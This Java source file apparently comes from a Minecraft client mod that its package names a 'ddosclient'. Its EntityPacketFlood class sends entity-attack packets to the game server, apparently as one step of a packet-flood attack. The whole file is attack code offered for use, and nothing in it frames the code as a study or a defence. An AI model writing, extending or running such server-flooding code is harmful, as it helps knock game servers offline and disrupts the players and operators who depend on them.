package com.ddosclient.attack.attacks;

import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.minecraft.entity.Entity;
import net.minecraft.util.Hand;

public class EntityPacketFlood extends BaseAttack {
    @Override
    public void execute(MinecraftClient mc) {
        if (mc.getNetworkHandler() == null || mc.world == null) return;
        for (Entity entity : mc.world.getEntities()) {
            if (entity != mc.player) {
                mc.getNetworkHandler().sendPacket(
                    PlayerInteractEntityC2SPacket.attack(entity, mc.player.isSneaking())
                );
                break;
            }
        }
    }
}
